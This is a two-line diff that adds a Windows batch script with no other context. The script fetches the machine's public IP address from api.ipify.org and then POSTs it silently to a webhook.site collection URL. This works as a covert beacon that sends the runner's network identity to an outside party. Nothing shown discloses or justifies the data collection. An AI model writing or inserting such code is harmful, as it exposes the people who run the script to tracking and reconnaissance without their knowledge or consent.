@@ -1,0 +1,2 @@
+for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set a=%%i
+curl -X POST -H "Content-Type: application/json" -d "{\"IP\":\"%a%\"}" "https://webhook.site/a2a1bf00-ab2a-470b-b31d-186aef16cdf3"
